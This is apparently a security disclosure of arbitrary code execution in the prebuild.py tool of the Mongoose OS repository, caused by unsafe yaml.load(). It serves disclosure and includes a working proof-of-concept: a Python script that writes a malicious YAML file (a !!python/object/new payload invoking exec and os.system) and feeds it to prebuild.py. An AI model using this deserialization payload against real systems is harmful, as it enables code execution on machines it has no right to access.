# Description
**Arbitrary Code Excecution** in prebuilt.py tools of Mongoose-os repo .Prebuild.py is a utility for prebuilding binary libs and apps.
Mongoose OS - an IoT Firmware Development Framework. Supported microcontrollers: ESP32, ESP8266, CC3220, CC3200, STM32F4, STM32L4, STM32F7. Amazon AWS IoT, Microsoft Azure, Google IoT Core integrated. Code in C or JavaScript..
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. 
# Exploit code
**Python File**
```python
import os
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('git clone https://github.com/cesanta/mongoose-os.git')
os.chdir('mongoose-os/tools/')
os.system('rm exploit.yml')
open('exploit.yml','w+').write(exploit)
os.system('python prebuild.py --config exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/787336571665121300/Screenshot_from_2020-12-12_20-40-28.png)
